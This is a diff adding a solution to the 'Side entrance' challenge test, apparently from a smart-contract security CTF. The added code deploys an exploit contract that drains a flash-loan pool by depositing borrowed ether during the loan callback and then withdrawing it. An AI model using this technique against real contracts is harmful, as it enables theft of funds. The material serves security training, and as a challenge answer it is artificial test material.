@@ -26,6 +26,12 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      // during execute do deposit
+      // then withdraw
+      let exploit = await (await ethers.getContractFactory('Exploit', player)).deploy();
+      await exploit.drainPool(pool.address);
+      expect(await pool.balances(exploit.address)).to.eq(ETHER_IN_POOL);
+      await exploit.connect(player).withdraw();
     });
 
     after(async function () {
